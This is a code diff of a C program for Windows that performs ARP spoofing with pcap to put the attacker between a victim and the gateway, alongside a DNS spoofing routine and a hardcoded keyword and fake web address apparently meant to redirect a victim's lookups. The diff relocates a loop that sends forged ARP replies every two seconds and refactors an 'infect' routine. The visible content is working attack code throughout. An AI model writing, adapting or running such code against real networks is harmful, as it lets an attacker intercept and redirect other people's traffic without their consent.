@@ -15,6 +15,49 @@ static char* keyword = "netflix";
 u_long fake_web = 264000259; // TODO 
 
 /*
+* @purpose: keep sending fake arp packets to maintain MITM.
+* @params: thread syntax.
+* @return 0.
+*/
+static DWORD WINAPI start_arp_spoofing(
+	LPVOID lparam
+)
+{
+	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);
+
+	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
+	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
+
+	/* build the packets */
+	build_packet(
+		victim_packet,
+		htonl(infect_params.gateway_ip),
+		htonl(infect_params.victim_ip),
+		infect_params.adapter->Address,
+		infect_params.victim_mac,
+		2
+	);
+
+	build_packet(
+		gateway_packet,
+		htonl(infect_params.victim_ip),
+		htonl(infect_params.gateway_ip),
+		infect_params.adapter->Address,
+		infect_params.gateway_mac,
+		2
+	);
+
+	while (!finished_infecting)
+	{
+		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
+		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
+		Sleep(2000);
+	}
+	finished_infecting = 0;
+	return 0;
+}
+
+/*
 * @purpose: adding the correct arp entries to the victim and gateway machines.
 * @params: None.
 * @return: void.
@@ -47,49 +90,6 @@ static void stop_arp_spoofing()
 
 	pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
 	pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
-}
-
-/*
-* @purpose: keep sending fake arp packets to maintain MITM.
-* @params: thread syntax.
-* @return 0.
-*/
-static DWORD WINAPI start_arp_spoofing(
-	LPVOID lparam
-)
-{
-	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);
-
-	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
-	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
-
-	/* build the packets */
-	build_packet(
-		victim_packet,
-		htonl(infect_params.gateway_ip),
-		htonl(infect_params.victim_ip),
-		infect_params.adapter->Address,
-		infect_params.victim_mac,
-		2 
-	);
-
-	build_packet(
-		gateway_packet,
-		htonl(infect_params.victim_ip),
-		htonl(infect_params.gateway_ip),
-		infect_params.adapter->Address,
-		infect_params.gateway_mac,
-		2
-	);
-
-	while (!finished_infecting)
-	{
-		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
-		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
-		Sleep(2000); 
-	}
-	finished_infecting = 0;
-	return 0;
 }
 
 /*
@@ -205,12 +205,8 @@ static size_t dns_spoofing(
 	return (BYTE*)temp_p - packet;
 }
 
-DWORD WINAPI infect(
-	LPVOID lparam
-)
+void infect()
 {
-	pCommand command = (pCommand)lparam;
-
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
 	ULONG outBufLen = 0;
 	ULONG netmask, host;
@@ -255,7 +251,7 @@ DWORD WINAPI infect(
 			host = ((struct sockaddr_in*)(addr->addr))->sin_addr.s_addr;
 			netmask = ((struct sockaddr_in*)(addr->netmask))->sin_addr.s_addr;
 
-			if ((host & netmask) == (command->victim_ip & netmask))
+			if ((host & netmask) == (infect_params.victim_ip & netmask))
 			{
 				found = 1; //true
 				break;
